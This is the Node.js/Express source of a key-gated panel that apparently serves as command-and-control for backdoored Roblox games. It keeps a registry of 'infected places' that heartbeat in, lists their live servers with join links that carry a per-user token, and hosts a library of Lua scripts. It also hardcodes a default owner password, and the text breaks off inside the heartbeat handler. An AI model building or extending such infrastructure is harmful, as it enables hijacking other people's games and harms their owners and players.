const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();

// ----- config -----
const PORT = process.env.PORT || 3000;
const PROD = process.env.NODE_ENV === 'production';

const DATA_DIR = path.join(__dirname, 'data');
const PUBLIC_DIR = path.join(__dirname, 'public');

const DEVS_FILE    = path.join(DATA_DIR, 'devs.json');
const USERS_FILE   = path.join(DATA_DIR, 'users.json');
const KEYS_FILE    = path.join(DATA_DIR, 'keys.json');
const SCRIPTS_FILE = path.join(DATA_DIR, 'scripts.json');
const LOGS_FILE    = path.join(DATA_DIR, 'logs.json');
const AUDIT_FILE   = path.join(DATA_DIR, 'audit.json');
const PLACES_FILE  = path.join(DATA_DIR, 'places.json');
const SECRET_FILE  = path.join(DATA_DIR, '.session-secret');

const LOG_MAX   = 2000;     // execution log entries
const AUDIT_MAX = 5000;     // audit log entries

// the bootstrap owner. always promoted to owner on startup. cannot be deleted.
// override with env OWNER_USERNAME.
const OWNER_USERNAME = (process.env.OWNER_USERNAME || 'bruvo').trim();

// optional shared secret for the Roblox -> /api/games/heartbeat call.
// if set, the heartbeat body must include { secret: HEARTBEAT_SECRET } or the request is rejected.
// leave unset to keep the endpoint open (rate-limited only).
const HEARTBEAT_SECRET = (process.env.HEARTBEAT_SECRET || '').trim();

// ----- helpers -----
function loadSessionSecret() {
  if (process.env.SESSION_SECRET) return process.env.SESSION_SECRET;
  fs.mkdirSync(DATA_DIR, { recursive: true });
  if (fs.existsSync(SECRET_FILE)) {
    const s = fs.readFileSync(SECRET_FILE, 'utf8').trim();
    if (s.length >= 32) return s;
  }
  const fresh = crypto.randomBytes(48).toString('hex');
  fs.writeFileSync(SECRET_FILE, fresh, { mode: 0o600 });
  return fresh;
}
const SESSION_SECRET = loadSessionSecret();

function readJson(file, fallback) {
  try { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : fallback; }
  catch { return fallback; }
}
function writeJson(file, data) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function seed() {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(DEVS_FILE)) {
    const u = process.env.SEED_DEV_USERNAME || OWNER_USERNAME;
    const p = process.env.SEED_DEV_PASSWORD || 'Bruvofr@2011';
    writeJson(DEVS_FILE, [{
      username: u,
      passwordHash: bcrypt.hashSync(p, 10),
      isOwner: true,
      createdAt: new Date().toISOString()
    }]);
  } else {
    // migration: ensure the bootstrap owner has isOwner=true; ensure at least one owner exists
    const devs = readJson(DEVS_FILE, []);
    let changed = false;
    const bootstrap = devs.find(d => d.username === OWNER_USERNAME);
    if (bootstrap && !bootstrap.isOwner) { bootstrap.isOwner = true; changed = true; }
    if (!devs.some(d => d.isOwner) && bootstrap) { bootstrap.isOwner = true; changed = true; }
    if (changed) writeJson(DEVS_FILE, devs);
  }
  if (!fs.existsSync(USERS_FILE))   writeJson(USERS_FILE, []);
  if (!fs.existsSync(KEYS_FILE))    writeJson(KEYS_FILE, []);
  if (!fs.existsSync(SCRIPTS_FILE)) writeJson(SCRIPTS_FILE, []);
  if (!fs.existsSync(LOGS_FILE))    writeJson(LOGS_FILE, []);
  if (!fs.existsSync(AUDIT_FILE))   writeJson(AUDIT_FILE, []);
  if (!fs.existsSync(PLACES_FILE))  writeJson(PLACES_FILE, []);
}
seed();

// ----- infected places registry (persistent) -----
// every game that has ever heartbeated is remembered here, so a place still shows
// up in /games even if it has no live servers right now. flushed to disk lazily.
const infectedPlaces = new Map();
let placesDirty = false;
(function loadInfectedPlaces() {
  const arr = readJson(PLACES_FILE, []);
  if (Array.isArray(arr)) {
    for (const p of arr) {
      if (p && p.placeId) infectedPlaces.set(String(p.placeId), p);
    }
  }
})();
function savePlacesIfDirty() {
  if (!placesDirty) return;
  try { writeJson(PLACES_FILE, [...infectedPlaces.values()]); placesDirty = false; }
  catch (e) { console.error('[places]', e && e.message); }
}
setInterval(savePlacesIfDirty, 60 * 1000).unref();
process.on('SIGTERM', savePlacesIfDirty);
process.on('SIGINT', () => { savePlacesIfDirty(); process.exit(0); });

if (PROD) app.set('trust proxy', 1);

// ----- security headers -----
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'same-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com data:",
    // allow Roblox CDN for game icons
    "img-src 'self' data: https://*.rbxcdn.com https://www.roblox.com https://tr.rbxcdn.com",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'"
  ].join('; '));
  if (PROD) res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

app.use(express.json({ limit: '128kb' }));
app.use(express.urlencoded({ extended: true, limit: '32kb' }));

app.use(session({
  name: 'skl.sid',
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  rolling: true,
  cookie: {
    maxAge: 1000 * 60 * 60 * 24 * 30,
    httpOnly: true,
    sameSite: 'lax',
    secure: PROD
  }
}));

// ----- rate limiting -----
const buckets = new Map();
function rateLimit({ windowMs, max, message = 'too many requests, please slow down' }) {
  return (req, res, next) => {
    const id = `${req.ip}:${req.route?.path || req.path}`;
    const now = Date.now();
    const arr = (buckets.get(id) || []).filter(t => now - t < windowMs);
    if (arr.length >= max) {
      res.setHeader('Retry-After', Math.ceil((arr[0] + windowMs - now) / 1000));
      return res.status(429).json({ error: message });
    }
    arr.push(now);
    buckets.set(id, arr);
    next();
  };
}
setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const [k, arr] of buckets) {
    const fresh = arr.filter(t => t > cutoff);
    if (fresh.length) buckets.set(k, fresh);
    else buckets.delete(k);
  }
}, 10 * 60 * 1000).unref();

const loginLimiter     = rateLimit({ windowMs: 15 * 60 * 1000, max: 8,   message: 'too many sign-in attempts. try again in a few minutes.' });
const signupLimiter    = rateLimit({ windowMs: 60 * 60 * 1000, max: 6,   message: 'too many account attempts. try again later.' });
const heartbeatLimiter = rateLimit({ windowMs: 60 * 1000,      max: 120, message: 'too many heartbeats' });
const checkLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 240, message: 'too many checks' });
const logLimiter       = rateLimit({ windowMs: 60 * 1000,      max: 240, message: 'too many log writes' });
const likeLimiter      = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'slow down on the likes' });
const writeLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'slow down' });
const auditLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'too many requests' });

// ----- in-memory state -----
const HEARTBEAT_TTL = 30 * 1000;
const ACTIVITY_WINDOW = 24 * 60 * 60 * 1000;

const activeGames = new Map();
const userActivity = new Map();

function touchActivity(username) { if (username) userActivity.set(username, Date.now()); }

setInterval(() => {
  const gameCutoff = Date.now() - HEARTBEAT_TTL;
  for (const [k, g] of activeGames) if (g.lastSeen < gameCutoff) activeGames.delete(k);
  const userCutoff = Date.now() - ACTIVITY_WINDOW;
  for (const [k, t] of userActivity) if (t < userCutoff) userActivity.delete(k);
}, 10 * 1000).unref();

app.use((req, res, next) => {
  if (req.session && req.session.user) touchActivity(req.session.user.username);
  next();
});

// ----- audit log -----
function audit(req, event, target, details = {}) {
  try {
    const u = req && req.session && req.session.user;
    const entry = {
      id: crypto.randomUUID(),
      at: new Date().toISOString(),
      actor: u ? u.username : null,
      kind: u ? u.kind : (req ? 'anon' : 'system'),
      event: String(event).slice(0, 64),
      target: target ? String(target).slice(0, 80) : null,
      details: details && typeof details === 'object' ? details : {},
      ip: req ? String(req.ip || '').slice(0, 64) : null
    };
    const all = readJson(AUDIT_FILE, []);
    all.unshift(entry);
    if (all.length > AUDIT_MAX) all.length = AUDIT_MAX;
    writeJson(AUDIT_FILE, all);
  } catch (e) {
    // never let audit failure break a request
    console.error('[audit]', e && e.message);
  }
}

// ----- key helpers -----
function genKey() {
  const raw = crypto.randomBytes(12).toString('hex').toUpperCase();
  return `SKL-${raw.slice(0,4)}-${raw.slice(4,8)}-${raw.slice(8,12)}-${raw.slice(12,16)}-${raw.slice(16,20)}-${raw.slice(20,24)}`;
}

const USERNAME_RE = /^[a-zA-Z0-9_-]+$/;
function validUsername(u) { return typeof u === 'string' && u.length >= 3 && u.length <= 24 && USERNAME_RE.test(u); }

// ----- session helpers -----
function userStillExists(session) {
  if (!session || !session.user) return false;
  const { username, kind } = session.user;
  const file = kind === 'dev' ? DEVS_FILE : USERS_FILE;
  const all = readJson(file, []);
  return !!all.find(u => u.username === username);
}
function isOwnerUsername(username) {
  if (!username) return false;
  const devs = readJson(DEVS_FILE, []);
  const d = devs.find(x => x.username === username);
  return !!(d && d.isOwner);
}
function requireUser(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'sign in to continue' });
  if (!userStillExists(req.session)) {
    return req.session.destroy(() => {
      res.clearCookie('skl.sid');
      res.status(401).json({ error: 'account no longer exists' });
    });
  }
  next();
}
function requireDev(req, res, next) {
  if (!req.session.user || req.session.user.kind !== 'dev') return res.status(403).json({ error: 'developers only' });
  if (!userStillExists(req.session)) {
    return req.session.destroy(() => {
      res.clearCookie('skl.sid');
      res.status(401).json({ error: 'account no longer exists' });
    });
  }
  next();
}
function requireOwner(req, res, next) {
  const u = req.session.user;
  if (!u || u.kind !== 'dev') return res.status(403).json({ error: 'owner only' });
  if (!userStillExists(req.session) || !isOwnerUsername(u.username)) {
    return res.status(403).json({ error: 'owner only' });
  }
  next();
}

function ensureGameToken(record, file, all) {
  if (!record.gameToken) {
    record.gameToken = crypto.randomBytes(18).toString('hex');
    writeJson(file, all);
  }
  return record.gameToken;
}

// ===== AUTH =====
app.post('/api/auth/signup', signupLimiter, (req, res) => {
  const { key, username, password } = req.body || {};
  if (typeof key !== 'string' || typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'all fields are required' });
  }
  if (!key || !username || !password) return res.status(400).json({ error: 'all fields are required' });
  if (!validUsername(username))        return res.status(400).json({ error: 'username must be 3–24 chars, letters/numbers/_/- only' });
  if (password.length < 8 || password.length > 128) return res.status(400).json({ error: 'password must be 8–128 characters' });

  const keys = readJson(KEYS_FILE, []);
  const k = keys.find(x => x.key === key.trim());
  if (!k)                                                  return res.status(404).json({ error: 'invalid key' });
  if (k.consumed)                                          return res.status(403).json({ error: 'this key has already been used' });
  if (k.revoked)                                           return res.status(403).json({ error: 'this key has been revoked' });
  if (k.expiresAt && new Date(k.expiresAt) < new Date())   return res.status(403).json({ error: 'this key has expired' });
  // key is bound to a specific username
  if (k.boundUsername && k.boundUsername !== username)     return res.status(403).json({ error: `this key is reserved for username "${k.boundUsername}"` });

  const users = readJson(USERS_FILE, []);
  const devs  = readJson(DEVS_FILE, []);
  if (users.find(u => u.username === username) || devs.find(d => d.username === username)) {
    return res.status(409).json({ error: 'that username is taken' });
  }

  users.push({
    username,
    passwordHash: bcrypt.hashSync(password, 10),
    createdAt: new Date().toISOString(),
    keyUsed: k.key,
    gameToken: crypto.randomBytes(18).toString('hex')
  });
  writeJson(USERS_FILE, users);

  k.consumed = true;
  k.consumedBy = username;
  k.consumedAt = new Date().toISOString();
  writeJson(KEYS_FILE, keys);

  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'session error' });
    req.session.user = { username, kind: 'user' };
    audit(req, 'auth.signup', username, { keyUsed: k.key });
    res.json({ ok: true, user: req.session.user });
  });
});

app.post('/api/auth/login', loginLimiter, (req, res) => {
  const { username, password } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'username and password are required' });
  }
  if (!username || !password) return res.status(400).json({ error: 'username and password are required' });
  if (username.length > 64 || password.length > 256) return res.status(400).json({ error: 'wrong username or password' });

  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let user = devs.find(u => u.username === username);
  let kind = 'dev';
  let bucketFile = DEVS_FILE;
  let bucketAll = devs;
  if (!user) { user = users.find(u => u.username === username); kind = 'user'; bucketFile = USERS_FILE; bucketAll = users; }
  if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
    audit(req, 'auth.login_failed', username, {});
    return res.status(401).json({ error: 'wrong username or password' });
  }
  ensureGameToken(user, bucketFile, bucketAll);
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'session error' });
    req.session.user = { username: user.username, kind };
    audit(req, 'auth.login', user.username, { kind });
    res.json({ ok: true, user: req.session.user });
  });
});

app.post('/api/auth/logout', (req, res) => {
  const u = req.session.user;
  if (u) audit(req, 'auth.logout', u.username, {});
  req.session.destroy(() => {
    res.clearCookie('skl.sid');
    res.json({ ok: true });
  });
});

app.get('/api/session', (req, res) => {
  if (!req.session.user) return res.json({ user: null });
  const isOwner = isOwnerUsername(req.session.user.username) && req.session.user.kind === 'dev';
  res.json({ user: { ...req.session.user, isOwner } });
});

// ===== DEVS (owner only) =====
app.get('/api/devs', requireOwner, (req, res) => {
  const devs = readJson(DEVS_FILE, []);
  res.json({
    devs: devs.map(d => ({
      username: d.username,
      createdAt: d.createdAt,
      addedBy: d.addedBy || null,
      isOwner: !!d.isOwner,
      isBootstrap: d.username === OWNER_USERNAME
    }))
  });
});

app.post('/api/devs', writeLimiter, requireOwner, (req, res) => {
  const { username, password, owner } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') return res.status(400).json({ error: 'username and password are required' });
  if (!validUsername(username)) return res.status(400).json({ error: 'username must be 3–24 chars, letters/numbers/_/- only' });
  if (password.length < 8 || password.length > 128) return res.status(400).json({ error: 'password must be 8–128 characters' });

  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  if (devs.find(d => d.username === username) || users.find(u => u.username === username)) {
    return res.status(409).json({ error: 'that username is taken' });
  }
  const newDev = {
    username,
    passwordHash: bcrypt.hashSync(password, 10),
    createdAt: new Date().toISOString(),
    gameToken: crypto.randomBytes(18).toString('hex'),
    addedBy: req.session.user.username,
    isOwner: !!owner
  };
  devs.push(newDev);
  writeJson(DEVS_FILE, devs);
  audit(req, 'dev.created', username, { isOwner: !!owner });
  res.json({ ok: true, username, isOwner: !!owner });
});

app.delete('/api/devs/:username', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  if (target === OWNER_USERNAME) return res.status(400).json({ error: 'cannot remove the bootstrap owner' });
  if (target === req.session.user.username) return res.status(400).json({ error: 'you cannot remove yourself here' });
  let devs = readJson(DEVS_FILE, []);
  const dev = devs.find(d => d.username === target);
  if (!dev) return res.status(404).json({ error: 'not found' });
  // require demote first if removing another owner
  if (dev.isOwner) return res.status(400).json({ error: 'demote this owner before removing' });
  devs = devs.filter(d => d.username !== target);
  writeJson(DEVS_FILE, devs);
  userActivity.delete(target);
  audit(req, 'dev.deleted', target, {});
  res.json({ ok: true });
});

app.post('/api/devs/:username/promote', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  const devs = readJson(DEVS_FILE, []);
  const d = devs.find(x => x.username === target);
  if (!d) return res.status(404).json({ error: 'not found' });
  if (d.isOwner) return res.json({ ok: true, isOwner: true });
  d.isOwner = true;
  writeJson(DEVS_FILE, devs);
  audit(req, 'dev.promoted', target, {});
  res.json({ ok: true, isOwner: true });
});

app.post('/api/devs/:username/demote', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  if (target === OWNER_USERNAME) return res.status(400).json({ error: 'cannot demote the bootstrap owner' });
  const devs = readJson(DEVS_FILE, []);
  const d = devs.find(x => x.username === target);
  if (!d) return res.status(404).json({ error: 'not found' });
  if (!d.isOwner) return res.json({ ok: true, isOwner: false });
  // ensure at least one owner remains
  const owners = devs.filter(x => x.isOwner).length;
  if (owners <= 1) return res.status(400).json({ error: 'must keep at least one owner' });
  d.isOwner = false;
  writeJson(DEVS_FILE, devs);
  audit(req, 'dev.demoted', target, {});
  res.json({ ok: true, isOwner: false });
});

// ===== KEYS (owner only) =====
app.get('/api/keys', requireOwner, (req, res) => {
  res.json({ keys: readJson(KEYS_FILE, []) });
});

app.post('/api/keys', writeLimiter, requireOwner, (req, res) => {
  const { username, durationHours = 0, note = '' } = req.body || {};
  if (!validUsername(username)) return res.status(400).json({ error: 'username is required (3–24 chars, letters/numbers/_/-)' });

  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  const keys  = readJson(KEYS_FILE, []);
  // username must be unique across devs, users, AND unconsumed keys (no double-reservation)
  if (devs.find(d => d.username === username) || users.find(u => u.username === username)) {
    return res.status(409).json({ error: 'that username is already taken by an account' });
  }
  if (keys.find(k => !k.consumed && !k.revoked && k.boundUsername === username && (!k.expiresAt || new Date(k.expiresAt) >= new Date()))) {
    return res.status(409).json({ error: 'a live key already reserves that username' });
  }

  const dh = Math.max(parseInt(durationHours, 10) || 0, 0);
  const safeNote = String(note || '').slice(0, 120);
  const k = {
    key: genKey(),
    boundUsername: username,
    createdBy: req.session.user.username,
    createdAt: new Date().toISOString(),
    expiresAt: dh > 0 ? new Date(Date.now() + dh * 3600 * 1000).toISOString() : null,
    consumed: false,
    revoked: false,
    note: safeNote
  };
  keys.push(k);
  writeJson(KEYS_FILE, keys);
  audit(req, 'key.created', k.key, { boundUsername: username, durationHours: dh });
  res.json({ ok: true, minted: [k] });
});

function purgeUserByKey(key) {
  const users = readJson(USERS_FILE, []);
  const removed = users.filter(u => u.keyUsed === key);
  if (!removed.length) return [];
  writeJson(USERS_FILE, users.filter(u => u.keyUsed !== key));
  for (const u of removed) userActivity.delete(u.username);
  return removed.map(u => u.username);
}

app.post('/api/keys/:key/revoke', writeLimiter, requireOwner, (req, res) => {
  const keys = readJson(KEYS_FILE, []);
  const e = keys.find(k => k.key === req.params.key);
  if (!e) return res.status(404).json({ error: 'not found' });
  e.revoked = true;
  writeJson(KEYS_FILE, keys);
  const removedUsers = purgeUserByKey(req.params.key);
  audit(req, 'key.revoked', e.key, { boundUsername: e.boundUsername || null, removedUsers });
  res.json({ ok: true, removedUsers });
});

app.delete('/api/keys/:key', writeLimiter, requireOwner, (req, res) => {
  let keys = readJson(KEYS_FILE, []);
  const e = keys.find(k => k.key === req.params.key);
  if (!e) return res.status(404).json({ error: 'not found' });
  keys = keys.filter(k => k.key !== req.params.key);
  writeJson(KEYS_FILE, keys);
  const removedUsers = purgeUserByKey(req.params.key);
  audit(req, 'key.deleted', e.key, { boundUsername: e.boundUsername || null, removedUsers });
  res.json({ ok: true, removedUsers });
});

// ===== SCRIPTS =====
const CATEGORIES = ['script', 'gui', 'morph'];
function normCategory(c) {
  const v = String(c || '').toLowerCase().trim();
  return CATEGORIES.includes(v) ? v : 'script';
}

app.get('/api/scripts', requireUser, (req, res) => {
  const scripts = readJson(SCRIPTS_FILE, []);
  const me = req.session.user.username;
  res.json({
    scripts: scripts.map(s => ({
      id: s.id,
      title: s.title,
      category: normCategory(s.category),
      tags: s.tags || [],
      author: s.author,
      body: s.body,
      createdAt: s.createdAt,
      updatedAt: s.updatedAt || null,
      likeCount: (s.likes || []).length,
      liked: (s.likes || []).includes(me)
    }))
  });
});

function buildScript({ title, body, tags, category, author }) {
  if (typeof title !== 'string' || typeof body !== 'string') return { error: 'title and body are required' };
  const t = title.trim();
  const b = body;
  if (!t || !b.trim()) return { error: 'title and body are required' };
  if (b.length > 32 * 1024) return { error: 'script body too large (max 32 KB)' };
  const rawTags = Array.isArray(tags) ? tags : String(tags || '').split(',');
  const cleanTags = rawTags.map(x => String(x).trim().slice(0, 24)).filter(Boolean).slice(0, 10);
  return {
    script: {
      id: crypto.randomUUID(),
      title: t.slice(0, 80),
      category: normCategory(category),
      tags: cleanTags,
      body: b,
      author,
      likes: [],
      createdAt: new Date().toISOString()
    }
  };
}

app.post('/api/scripts', writeLimiter, requireDev, (req, res) => {
  const { title, tags = [], body, category } = req.body || {};
  const r = buildScript({ title, body, tags, category, author: req.session.user.username });
  if (r.error) return res.status(r.error.includes('too large') ? 413 : 400).json({ error: r.error });
  const scripts = readJson(SCRIPTS_FILE, []);
  scripts.unshift(r.script);
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.created', r.script.id, { title: r.script.title, category: r.script.category });
  res.json({ ok: true, script: r.script });
});

const IMPORT_MAX = 500;
app.post('/api/scripts/import', writeLimiter, requireDev, (req, res) => {
  const { items } = req.body || {};
  if (!Array.isArray(items)) return res.status(400).json({ error: 'expected { items: [ ... ] }' });
  if (items.length === 0) return res.status(400).json({ error: 'no items to import' });
  if (items.length > IMPORT_MAX) return res.status(400).json({ error: `too many items at once (max ${IMPORT_MAX})` });

  const scripts = readJson(SCRIPTS_FILE, []);
  const imported = [];
  const skipped = [];
  for (let i = 0; i < items.length; i++) {
    const it = items[i] || {};
    const r = buildScript({
      title: it.title,
      body: it.body,
      tags: it.tags,
      category: it.category,
      author: req.session.user.username
    });
    if (r.error) { skipped.push({ index: i, title: it.title || null, reason: r.error }); continue; }
    scripts.unshift(r.script);
    imported.push({ id: r.script.id, title: r.script.title, category: r.script.category });
  }
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.imported', null, { count: imported.length, skipped: skipped.length });
  res.json({ ok: true, imported: imported.length, skipped: skipped.length, skippedDetail: skipped.slice(0, 20) });
});

// edit your own script
app.patch('/api/scripts/:id', writeLimiter, requireDev, (req, res) => {
  const scripts = readJson(SCRIPTS_FILE, []);
  const s = scripts.find(x => x.id === req.params.id);
  if (!s) return res.status(404).json({ error: 'not found' });
  const me = req.session.user.username;
  if (s.author !== me && !isOwnerUsername(me)) return res.status(403).json({ error: 'only the author can edit this' });

  const { title, body, tags, category } = req.body || {};
  if (title !== undefined) {
    if (typeof title !== 'string') return res.status(400).json({ error: 'invalid title' });
    const t = title.trim();
    if (!t) return res.status(400).json({ error: 'title cannot be empty' });
    s.title = t.slice(0, 80);
  }
  if (body !== undefined) {
    if (typeof body !== 'string') return res.status(400).json({ error: 'invalid body' });
    if (!body.trim()) return res.status(400).json({ error: 'body cannot be empty' });
    if (body.length > 32 * 1024) return res.status(413).json({ error: 'script body too large (max 32 KB)' });
    s.body = body;
  }
  if (category !== undefined) s.category = normCategory(category);
  if (tags !== undefined) {
    const rawTags = Array.isArray(tags) ? tags : String(tags || '').split(',');
    s.tags = rawTags.map(x => String(x).trim().slice(0, 24)).filter(Boolean).slice(0, 10);
  }
  s.updatedAt = new Date().toISOString();
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.edited', s.id, { title: s.title });
  res.json({ ok: true, script: s });
});

app.delete('/api/scripts/:id', writeLimiter, requireDev, (req, res) => {
  let scripts = readJson(SCRIPTS_FILE, []);
  const t = scripts.find(s => s.id === req.params.id);
  if (!t) return res.status(404).json({ error: 'not found' });
  const me = req.session.user.username;
  if (t.author !== me && !isOwnerUsername(me)) return res.status(403).json({ error: 'only the author can remove this' });
  scripts = scripts.filter(s => s.id !== req.params.id);
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.deleted', t.id, { title: t.title, author: t.author });
  res.json({ ok: true });
});

app.post('/api/scripts/:id/like', likeLimiter, requireUser, (req, res) => {
  const scripts = readJson(SCRIPTS_FILE, []);
  const s = scripts.find(x => x.id === req.params.id);
  if (!s) return res.status(404).json({ error: 'not found' });
  s.likes = s.likes || [];
  const u = req.session.user.username;
  const i = s.likes.indexOf(u);
  let liked;
  if (i >= 0) { s.likes.splice(i, 1); liked = false; }
  else        { s.likes.push(u);      liked = true; }
  writeJson(SCRIPTS_FILE, scripts);
  res.json({ ok: true, liked, count: s.likes.length });
});

// ===== GAMES =====
function bucketFor(n) {
  if (n >= 1000) return '1k+';
  if (n >= 100) return '100-1k';
  if (n >= 25) return '25-100';
  return '0-25';
}

// build a usable thumbnail URL. trust the heartbeat's URL only if it's an https roblox cdn url;
// otherwise fall back to the legacy asset-thumbnail URL based on placeId.
function thumbUrlFor(placeId, raw) {
  if (typeof raw === 'string') {
    const r = raw.trim();
    if (/^https:\/\/[\w.-]*\.rbxcdn\.com\//i.test(r)) return r;
    if (/^https:\/\/(www\.)?roblox\.com\//i.test(r)) return r;
  }
  const id = String(placeId || '').replace(/[^0-9]/g, '');
  if (!id) return null;
  return `https://www.roblox.com/asset-thumbnail/image?assetId=${id}&width=420&height=420&format=Png`;
}

function getMyToken(username) {
  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let rec = devs.find(d => d.username === username);
  let bucketFile = DEVS_FILE, bucketAll = devs;
  if (!rec) { rec = users.find(u => u.username === username); bucketFile = USERS_FILE; bucketAll = users; }
  if (!rec) return '';
  return ensureGameToken(rec, bucketFile, bucketAll);
}

function buildJoinUrl(placeId, jobId, token) {
  return `https://www.roblox.com/games/start?placeId=${encodeURIComponent(placeId)}&gameInstanceId=${encodeURIComponent(jobId)}&launchData=${encodeURIComponent(token)}`;
}

app.get('/api/games', requireUser, (req, res) => {
  const cutoff = Date.now() - HEARTBEAT_TTL;
  const me = req.session.user.username;
  const token = getMyToken(me);

  const byPlace = new Map();

  // 1) seed with every place we've ever seen so offline places still list
  for (const p of infectedPlaces.values()) {
    byPlace.set(p.placeId, {
      placeId: p.placeId,
      name: p.name || 'Untitled',
      thumbnail: thumbUrlFor(p.placeId, p.thumbnail),
      firstSeen: p.firstSeen || null,
      lastSeen: p.lastSeen || null,
      servers: [],
      totalPlayers: 0,
      pageUrl: `https://www.roblox.com/games/${encodeURIComponent(p.placeId)}`
    });
  }

  // 2) overlay live servers (heartbeated within TTL)
  const live = [...activeGames.values()].filter(g => g.lastSeen >= cutoff);
  for (const g of live) {
    if (!byPlace.has(g.placeId)) {
      byPlace.set(g.placeId, {
        placeId: g.placeId,
        name: g.name,
        thumbnail: thumbUrlFor(g.placeId, g.thumbnail),
        firstSeen: null,
        lastSeen: new Date(g.lastSeen).toISOString(),
        servers: [],
        totalPlayers: 0,
        pageUrl: `https://www.roblox.com/games/${encodeURIComponent(g.placeId)}`
      });
    }
    const grp = byPlace.get(g.placeId);
    grp.totalPlayers += g.players;
    if (!grp.thumbnail) grp.thumbnail = thumbUrlFor(g.placeId, g.thumbnail);
    if (!grp.name || grp.name === 'Untitled') grp.name = g.name;
    grp.servers.push({
      id: g.jobId,
      players: g.players,
      maxPlayers: g.maxPlayers,
      lastSeen: g.lastSeen,
      joinUrl: buildJoinUrl(g.placeId, g.jobId, token)
    });
  }

  const games = [...byPlace.values()]
    .map(grp => {
      grp.servers.sort((a, b) => b.players - a.players);
      grp.serverCount = grp.servers.length;
      grp.bucket = bucketFor(grp.totalPlayers);
      grp.live = grp.servers.length > 0;
      return grp;
    })
    // live games first (by player count); then offline by most recently seen
    .sort((a, b) => {
      if (a.live !== b.live) return a.live ? -1 : 1;
      if (a.live) return b.totalPlayers - a.totalPlayers;
      return new Date(b.lastSeen || 0) - new Date(a.lastSeen || 0);
    });
  res.json({ games });
});

// owner-only: forget a place (e.g. it's been cleansed or you don't want it shown)
app.delete('/api/places/:placeId', writeLimiter, requireOwner, (req, res) => {
  const placeId = String(req.params.placeId || '').replace(/[^0-9]/g, '').slice(0, 32);
  if (!placeId) return res.status(400).json({ error: 'invalid placeId' });
  if (!infectedPlaces.has(placeId)) return res.status(404).json({ error: 'not found' });
  infectedPlaces.delete(placeId);
  placesDirty = true;
  savePlacesIfDirty();
  audit(req, 'place.forgotten', placeId, {});
  res.json({ ok: true });
});

app.get('/api/games/:placeId', requireUser, (req, res) => {
  const placeId = String(req.params.placeId || '').replace(/[^0-9]/g, '').slice(0, 32);
  if (!placeId) return res.status(400).json({ error: 'invalid placeId' });
  const cutoff = Date.now() - HEARTBEAT_TTL;
  const me = req.session.user.username;
  const token = getMyToken(me);

  const live = [...activeGames.values()].filter(g => g.lastSeen >= cutoff && g.placeId === placeId);
  const stored = infectedPlaces.get(placeId);
  if (!live.length && !stored) return res.json({ game: null });

  const name = (live[0] && live[0].name) || (stored && stored.name) || 'Untitled';
  const thumb = thumbUrlFor(
    placeId,
    (live.map(g => g.thumbnail).find(Boolean)) || (stored && stored.thumbnail)
  );
  const game = {
    placeId,
    name,
    thumbnail: thumb,
    pageUrl: `https://www.roblox.com/games/${encodeURIComponent(placeId)}`,
    firstSeen: stored ? stored.firstSeen : null,
    lastSeen: stored ? stored.lastSeen : (live[0] ? new Date(live[0].lastSeen).toISOString() : null),
    totalPlayers: live.reduce((s, g) => s + g.players, 0),
    serverCount: live.length,
    live: live.length > 0,
    servers: live
      .map(g => ({
        id: g.jobId,
        players: g.players,
        maxPlayers: g.maxPlayers,
        lastSeen: g.lastSeen,
        joinUrl: buildJoinUrl(placeId, g.jobId, token)
      }))
      .sort((a, b) => b.players - a.players)
  };
  game.bucket = bucketFor(game.totalPlayers);
  res.json({ game });
});

app.post('/api/games/heartbeat', heartbeatLimiter, (req, res) => {
  const { placeId, jobId, name, players, maxPlayers, thumbnail, secret } = req.body || {};
  if (HEARTBEAT_SECRET && secret !== HEARTBEAT_SECRET) return res.status(403).json({ error: 'forbidden' });
